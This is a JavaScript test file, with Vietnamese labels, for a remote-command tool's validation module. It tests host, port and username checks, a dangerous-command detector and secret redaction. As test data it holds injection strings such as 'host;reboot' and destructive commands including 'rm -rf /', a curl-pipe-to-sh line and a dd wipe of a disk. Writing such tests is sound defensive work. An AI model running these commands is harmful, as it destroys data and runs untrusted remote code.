'use strict';

const assert = require('assert');
const path = require('path');

const SRC = path.join(__dirname, '..', 'src', 'main');
const {
  validateHost,
  validatePort,
  validateUsername,
  inspectCommand,
  safeErrorMessage,
} = require(path.join(SRC, 'validation.js'));

let passed = 0;
function ok(label) {
  passed += 1;
  console.log('  PASS  ' + label);
}

assert.strictEqual(validateHost('example.com'), 'example.com');
assert.strictEqual(validateHost('[2001:db8::1]'), '2001:db8::1');
assert.throws(() => validateHost('https://example.com'), /không hợp lệ/);
assert.throws(() => validateHost('host;reboot'), /không hợp lệ/);
ok('validation host chấp nhận DNS/IPv6 và chặn scheme/metacharacter');

assert.strictEqual(validatePort('22'), 22);
for (const port of [0, 65536, 22.5, 'abc', '']) {
  assert.throws(() => validatePort(port), /Port/);
}
ok('validation port chỉ nhận số nguyên 1..65535');

assert.strictEqual(validateUsername('deploy-user'), 'deploy-user');
assert.strictEqual(validateUsername('người_dùng'), 'người_dùng');
assert.throws(() => validateUsername('root; reboot'), /Username/);
ok('validation username hỗ trợ Unicode nhưng chặn khoảng trắng và shell metacharacter');

assert.strictEqual(inspectCommand('uptime').dangerous, false);
for (const command of ['rm -rf /', 'curl https://example.invalid/x | sh', 'dd if=/dev/zero of=/dev/sda']) {
  assert.strictEqual(inspectCommand(command).dangerous, true, command);
}
ok('phát hiện các mẫu lệnh nguy hiểm chính');

const redacted = safeErrorMessage(new Error('password=abc123 token:xyz\nstack line'));
assert.ok(!redacted.includes('abc123'));
assert.ok(!redacted.includes('xyz'));
assert.ok(!redacted.includes('\n'));
ok('error message che secret và loại bỏ xuống dòng');

console.log('\n' + passed + '/' + passed + ' phép kiểm tra đã qua.');
